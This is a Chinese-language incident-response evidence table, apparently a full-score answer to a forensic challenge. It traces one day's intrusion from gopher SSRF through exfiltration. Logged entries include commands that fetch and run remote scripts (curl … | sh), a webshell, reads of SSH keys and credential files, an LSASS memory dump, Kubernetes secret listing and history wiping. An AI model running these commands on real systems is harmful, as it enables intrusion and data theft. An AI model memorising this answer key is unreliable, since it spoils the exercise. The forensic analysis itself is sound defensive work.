# 攻击证据完整清单（104 条，evidence discovery 满分版）

来源：`~/Downloads/submission-new/evidence.csv`，全部事件发生在 **2026-07-06**。

| # | 时间 | 来源 | 证据 event_id | 阶段 | 内容 |
|---|---|---|---|---|---|
| E001 | 09:05:00 | edge/firewall | `fw-20260706-144141` | 侦查 recon | 攻击者 198.51.100.77 扫描 /login (recon path) |
| E002 | 09:05:01 | edge/waf | `waf-20260706-096141` | 侦查 recon | WAF 外部探测 /login |
| E003 | 09:05:12 | edge/firewall | `fw-20260706-144142` | 侦查 recon | 扫描 /api |
| E004 | 09:05:13 | edge/waf | `waf-20260706-096142` | 侦查 recon | 探测 /api |
| E005 | 09:05:24 | edge/firewall | `fw-20260706-144143` | 侦查 recon | 扫描 /upload |
| E006 | 09:05:25 | edge/waf | `waf-20260706-096143` | 侦查 recon | 探测 /upload |
| E007 | 09:05:36 | edge/firewall | `fw-20260706-144144` | 侦查 recon | 扫描 /oa/preview |
| E008 | 09:05:37 | edge/waf | `waf-20260706-096144` | 侦查 recon | 探测 /oa/preview |
| E009 | 09:05:48 | edge/firewall | `fw-20260706-144145` | 侦查 recon | 扫描 /admin |
| E010 | 09:05:49 | edge/waf | `waf-20260706-096145` | 侦查 recon | 探测 /admin |
| E011 | 09:14:22 | artifacts/pcap | `artifact-pcap-20260706-072042` | 初始访问 initial_access | 包72042: 198.51.100.77→10.20.10.21 POST /oa/preview (Host: oa.example), gopher SSRF |
| E012 | 09:14:22 | edge/waf | `waf-20260706-096146` | 初始访问 initial_access | SSRF 告警 WAF-SSRF-8842, /oa/preview?url=gopher://127.0.0.1:6379/_eval |
| E013 | 09:14:23 | linux/nginx | `nginx-20260706-000001` | 初始访问 initial_access | nginx 记录 SSRF 请求 status=200 |
| E014 | 09:14:24 | app/oa_app | `oa-20260706-017559` | 初始访问 initial_access | OA preview 后端请求完成 (gopher://127.0.0.1:6379/_eval) |
| E015 | 09:16:10 | linux/web-prod-01 auditd | `audit-web-20260706-024801` | 执行 execution | www-data: bash -c curl -fsSL https://203.0.113.60/a.sh | sh |
| E016 | 09:16:14 | artifacts/pcap | `artifact-pcap-20260706-072073` | 执行 execution | 包72073: 10.20.10.21→203.0.113.60 GET /a.sh (Host: update-cache.example) |
| E017 | 09:16:14 | network/proxy | `proxy-20260706-112001` | 执行 execution | 代理记录 a.sh 下载 (script download from unusual domain) |
| E018 | 09:16:26 | edge/firewall | `fw-20260706-144146` | 执行 execution | 反向 HTTPS 会话 web-prod-01→198.51.100.77 (atk-callback-01) |
| E019 | 09:16:30 | security/edr | `edr-20260706-010135` | 执行 execution | EDR: nginx worker 执行 bash 并外连 |
| E020 | 09:20:05 | linux/web-prod-01 auditd | `audit-web-20260706-024802` | 持久化 persistence | www-data 写入 /var/www/oa/public/.cache.php (webshell) |
| E021 | 09:20:14 | linux/nginx | `nginx-20260706-000002` | 持久化 persistence | 攻击者 POST /public/.cache.php status=200 (webshell 利用) |
| E022 | 09:20:17 | security/edr | `edr-20260706-010136` | 持久化 persistence | EDR: public 目录下生成 php 文件 |
| E023 | 09:24:00 | linux/web-prod-01 auditd | `audit-web-20260706-024803` | 发现 discovery | www-data: id |
| E024 | 09:24:11 | linux/web-prod-01 auditd | `audit-web-20260706-024804` | 发现 discovery | www-data: hostname -f |
| E025 | 09:24:22 | linux/web-prod-01 auditd | `audit-web-20260706-024805` | 发现 discovery | www-data: ip route |
| E026 | 09:24:33 | linux/web-prod-01 auditd | `audit-web-20260706-024806` | 发现 discovery | www-data: cat /etc/hosts |
| E027 | 09:24:44 | linux/web-prod-01 auditd | `audit-web-20260706-024807` | 发现 discovery | www-data: env |
| E028 | 09:31:00 | linux/web-prod-01 auditd | `audit-web-20260706-024808` | 凭据访问 credential_access | 读取 /opt/oa/.env (数据库连接串) |
| E029 | 09:31:24 | linux/web-prod-01 auditd | `audit-web-20260706-024809` | 凭据访问 credential_access | 读取 /home/deploy/.ssh/id_rsa (deploy SSH 私钥) |
| E030 | 09:31:48 | linux/web-prod-01 auditd | `audit-web-20260706-024810` | 凭据访问 credential_access | 读取 /opt/oa/config/prod.yml (GitLab token) |
| E031 | 09:39:15 | artifacts/pcap | `artifact-pcap-20260706-072344` | 横向移动 lateral_movement | 包72344: 10.20.10.21→10.20.30.11 SSH (横向移动) |
| E032 | 09:39:15 | edge/firewall | `fw-20260706-144147` | 横向移动 lateral_movement | web-prod-01→ops-jump-01:22 (web server ssh to ops jump) |
| E033 | 09:39:18 | linux/ops-jump-01 auth | `auth-ops-20260706-016892` | 横向移动 lateral_movement | sshd: Accepted publickey for deploy from 10.20.10.21 (窃取私钥登录) |
| E034 | 09:39:19 | network/netflow | `netflow-20260706-152001` | 横向移动 lateral_movement | 长 SSH 会话 web→jump |
| E035 | 09:45:00 | linux/ops-jump-01 auditd | `audit-ops-20260706-024801` | 发现 discovery | deploy: cat /etc/ansible/hosts (主机清单) |
| E036 | 09:45:16 | linux/ops-jump-01 auditd | `audit-ops-20260706-024802` | 发现 discovery | deploy: cat /home/deploy/.bash_history |
| E037 | 09:45:32 | linux/ops-jump-01 auditd | `audit-ops-20260706-024803` | 发现 discovery | deploy: cat /srv/runbooks/db.yml (BI 库凭据) |
| E038 | 09:51:00 | data/mysql_core | `mysql-20260706-036001` | 凭据使用 credential_use | crm_ro 从 web-prod-01 登录 (outside app pool) |
| E039 | 09:51:01 | edge/firewall | `fw-20260706-144148` | 凭据使用 credential_use | web-prod-01→mysql-core-01:3306 (web direct mysql login) |
| E040 | 09:55:00 | data/mysql_core | `mysql-20260706-036002` | 发现 discovery | show tables (88 张) |
| E041 | 09:55:15 | data/mysql_core | `mysql-20260706-036003` | 发现 discovery | select customer |
| E042 | 09:55:30 | data/mysql_core | `mysql-20260706-036004` | 发现 discovery | select orders |
| E043 | 09:55:45 | data/mysql_core | `mysql-20260706-036005` | 发现 discovery | select information_schema.columns |
| E044 | 10:02:00 | linux/ops-jump-01 auditd | `audit-ops-20260706-024804` | 凭据访问 credential_access | deploy: cat /srv/ansible/group_vars/windows.yml (Windows 凭据) |
| E045 | 10:02:17 | linux/ops-jump-01 auditd | `audit-ops-20260706-024805` | 凭据访问 credential_access | deploy: klist (Kerberos 票据) |
| E046 | 10:02:34 | linux/ops-jump-01 auditd | `audit-ops-20260706-024806` | 凭据访问 credential_access | deploy: grep -R svc_backup /srv/ansible |
| E047 | 10:03:00 | data/mysql_core | `mysql-20260706-036006` | 凭据访问 credential_access | select key,value from sys_config where key like '%bi%' |
| E048 | 10:03:05 | security/edr | `edr-20260706-010138` | 凭据访问 credential_access | EDR: 应用账号查询含密码键的配置表 |
| E049 | 10:05:00 | linux/ops-jump-01 auditd | `audit-ops-20260706-024807` | 凭据访问 credential_access | deploy: cat ~/.git-credentials (GitLab PAT) |
| E050 | 10:05:18 | app/gitlab | `gitlab-20260706-017582` | 凭据使用 credential_use | svc_deploy PAT 从跳板机登录 (PAT login from jump host) |
| E051 | 10:08:00 | network/netflow | `netflow-20260706-152002` | 发现 discovery | 跳板机→ad-dc-01:389 LDAP 枚举 |
| E052 | 10:08:06 | artifacts/windows xml | `artifact-winsec-20260706-000001` | 凭据使用 credential_use | XML: AD 4624 svc_backup 网络登录 (来源 10.20.30.11) |
| E053 | 10:08:06 | windows/ad-dc-01 security | `winsec-ad-20260706-000001` | 凭据使用 credential_use | 4624 network logon from unusual source |
| E054 | 10:08:11 | artifacts/windows xml | `artifact-winsec-20260706-000002` | 凭据使用 credential_use | XML: AD 4769 Kerberos 服务票据 ldap/ad-dc-01 |
| E055 | 10:08:11 | windows/ad-dc-01 security | `winsec-ad-20260706-000002` | 凭据使用 credential_use | 4769 kerberos service ticket requested from jump |
| E056 | 10:10:00 | app/gitlab | `gitlab-20260706-017583` | 发现 discovery | list_projects (group/prod) |
| E057 | 10:10:12 | app/gitlab | `gitlab-20260706-017584` | 发现 discovery | list_runners (group/prod) |
| E058 | 10:10:24 | app/gitlab | `gitlab-20260706-017585` | 发现 discovery | read_ci_variables (group/prod) |
| E059 | 10:12:00 | data/pgsql_bi | `pgsql-20260706-028001` | 凭据使用 credential_use | bi_sync 从跳板机登录 (bi_sync login from jump host) |
| E060 | 10:12:01 | network/netflow | `netflow-20260706-152004` | 凭据使用 credential_use | 跳板机→pgsql-bi-01:5432 (jump to bi database) |
| E061 | 10:13:00 | windows/ad-dc-01 sysmon | `sysmon-ad-20260706-000001` | 发现 discovery | svc_backup: net group 'Domain Admins' /domain |
| E062 | 10:13:20 | windows/ad-dc-01 sysmon | `sysmon-ad-20260706-000002` | 发现 discovery | svc_backup: nltest /dclist:corp.local |
| E063 | 10:13:40 | windows/ad-dc-01 sysmon | `sysmon-ad-20260706-000003` | 发现 discovery | svc_backup: net view /domain |
| E064 | 10:18:00 | app/gitlab | `gitlab-20260706-017586` | 执行 execution | pipeline_create 设置变量 DEBUG_SCRIPT (project/oa-prod pipeline/99031) |
| E065 | 10:18:00 | data/pgsql_bi | `pgsql-20260706-028002` | 收集 collection | COPY dw_customer_full TO STDOUT (21.5万行) |
| E066 | 10:18:21 | app/jenkins | `jenkins-20260706-018063` | 执行 execution | gitlab webhook 触发 jenkins 作业 (unusual variable) |
| E067 | 10:18:40 | data/pgsql_bi | `pgsql-20260706-028003` | 收集 collection | COPY dw_order_detail TO STDOUT (44.4万行) |
| E068 | 10:19:20 | data/pgsql_bi | `pgsql-20260706-028004` | 收集 collection | COPY dw_invoice_2026 TO STDOUT (36.9万行) |
| E069 | 10:22:00 | artifacts/windows xml | `artifact-winsec-20260706-000003` | 横向移动 lateral_movement | XML: win-admin-01 4624 svc_backup 远程交互登录 (LogonType 10) |
| E070 | 10:22:00 | windows/win-admin-01 security | `winsec-win-20260706-024842` | 横向移动 lateral_movement | 4624 remote interactive logon by service account |
| E071 | 10:22:03 | windows/win-admin-01 security | `winsec-win-20260706-024843` | 权限提升 privilege_escalation | 4672 特殊权限 SeDebugPrivilege,SeBackupPrivilege |
| E072 | 10:24:00 | linux/ci-runner-01 auditd | `audit-ci-20260706-000001` | 执行 execution | gitlab-runner: bash -c curl -fsSL https://203.0.113.60/ci.sh | bash |
| E073 | 10:24:05 | security/edr | `edr-20260706-010139` | 执行 execution | EDR: CI runner 执行远程脚本 (unexpected remote shell script in pipeline) |
| E074 | 10:27:00 | artifacts/windows xml | `artifact-sysmon-20260706-000001` | 凭据访问 credential_access | XML: win-admin-01 procdump.exe -ma lsass.exe C:\Windows\Temp\ls.dmp |
| E075 | 10:27:00 | windows/win-admin-01 sysmon | `sysmon-win-20260706-024801` | 凭据访问 credential_access | procdump lsass (lsass memory access) |
| E076 | 10:27:02 | security/edr | `edr-20260706-010137` | 凭据访问 credential_access | EDR: LSASS 内存转储行为 (credential dumping behavior) |
| E077 | 10:28:00 | linux/ci-runner-01 auditd | `audit-ci-20260706-000002` | 凭据访问 credential_access | gitlab-runner: cat token (K8s SA token) |
| E078 | 10:28:12 | cloud/k8s_audit | `k8s-20260706-018130` | 凭据使用 credential_use | ci-runner SA token 被使用 (token_review) |
| E079 | 10:34:00 | cloud/k8s_audit | `k8s-20260706-018131` | 凭据访问 credential_access | kubectl get secrets (namespace prod) |
| E080 | 10:34:12 | cloud/k8s_audit | `k8s-20260706-018132` | 发现 discovery | kubectl get pods |
| E081 | 10:34:24 | cloud/k8s_audit | `k8s-20260706-018133` | 发现 discovery | kubectl get configmaps |
| E082 | 10:41:00 | windows/file-srv-01 security | `winsec-fil-20260706-024848` | 收集 collection | 5145 读取财务共享 \\file-srv-01\finance Finance2025/Q2/contracts |
| E083 | 10:41:04 | artifacts/windows xml | `artifact-sysmon-20260706-000002` | 收集 collection | XML: file-srv-01 robocopy 写入 C:\Temp\f (bulk copy) |
| E084 | 10:41:04 | windows/file-srv-01 sysmon | `sysmon-fil-20260706-024801` | 收集 collection | robocopy \\file-srv-01\finance C:\Temp\f /E (bulk copy finance files) |
| E085 | 10:42:00 | cloud/cloud_iam | `iam-20260706-018161` | 凭据使用 credential_use | assume_role role/oss-backup-reader (使用 ci-runner SA) |
| E086 | 10:42:09 | cloud/object_storage | `obj-20260706-017768` | 发现 discovery | list bucket/prod-backup (list production backup bucket) |
| E087 | 10:49:00 | windows/win-admin-01 sysmon | `sysmon-win-20260706-024802` | 收集 collection | 7z.exe a C:\Temp\finance_q2.7z C:\Temp\f (archive finance files) |
| E088 | 10:49:30 | network/netflow | `netflow-20260706-152003` | 收集 collection | win-admin-01→ops-jump-01:445 大 SMB 传输 182MB (large smb transfer to jump) |
| E089 | 11:08:00 | network/proxy | `proxy-20260706-112002` | 外带 exfiltration | POST https://archive-sync-bkt.storage.example/upload/bi_part01.zst (268MB) |
| E090 | 11:08:01 | edge/firewall | `fw-20260706-144149` | 外带 exfiltration | ops-jump-01→203.0.113.210:443 大出站上传 270MB |
| E091 | 11:15:00 | cloud/object_storage | `obj-20260706-017769` | 收集 collection | get_object bucket/prod-backup/erp_full_20260705.tar.zst (734MB) |
| E092 | 11:15:30 | network/proxy | `proxy-20260706-112003` | 外带 exfiltration | PUT https://archive-sync-bkt.storage.example/upload/erp_full_20260705.tar.zst (734MB) |
| E093 | 11:35:00 | linux/ops-jump-01 auditd | `audit-ops-20260706-024808` | 收集 collection | deploy: mkdir -p /tmp/.cache/.stage |
| E094 | 11:35:25 | linux/ops-jump-01 auditd | `audit-ops-20260706-024809` | 收集 collection | deploy: tar -cf /tmp/.cache/.stage/full.tar finance_q2.7z bi_part01.zst |
| E095 | 11:35:50 | linux/ops-jump-01 auditd | `audit-ops-20260706-024810` | 收集 collection | deploy: sha256sum full.tar |
| E096 | 11:42:00 | linux/ops-jump-01 auditd | `audit-ops-20260706-024811` | 防御规避 defense_evasion | deploy: rm -f /tmp/ci.sh /tmp/a.sh |
| E097 | 11:42:11 | linux/ops-jump-01 auditd | `audit-ops-20260706-024812` | 防御规避 defense_evasion | deploy: history -c |
| E098 | 11:42:22 | linux/ops-jump-01 auditd | `audit-ops-20260706-024813` | 防御规避 defense_evasion | deploy: find /tmp/.cache -name '*.log' -delete |
| E099 | 11:50:00 | artifacts/pcap | `artifact-pcap-20260706-073871` | 外带 exfiltration | 包73871: 10.20.30.11 DNS 查询 cdn-sync.example |
| E100 | 11:50:00 | network/dns | `dns-20260706-144001` | 外带 exfiltration | 10.20.30.11 查询 cdn-sync.example → 203.0.113.77 |
| E101 | 11:50:12 | artifacts/pcap | `artifact-pcap-20260706-073875` | 外带 exfiltration | 包73875: 10.20.30.11→203.0.113.77:443 上传 |
| E102 | 11:50:12 | network/proxy | `proxy-20260706-112004` | 外带 exfiltration | POST https://cdn-sync.example/sync/full.tar (1GB, final large exfiltration) |
| E103 | 11:50:14 | edge/firewall | `fw-20260706-144150` | 外带 exfiltration | ops-jump-01→203.0.113.77:443 最终外带 1.07GB |
| E104 | 11:50:18 | security/ids | `ids-20260706-010047` | 外带 exfiltration | IDS: 罕见域名大上传告警 (rare domain and large upload) |
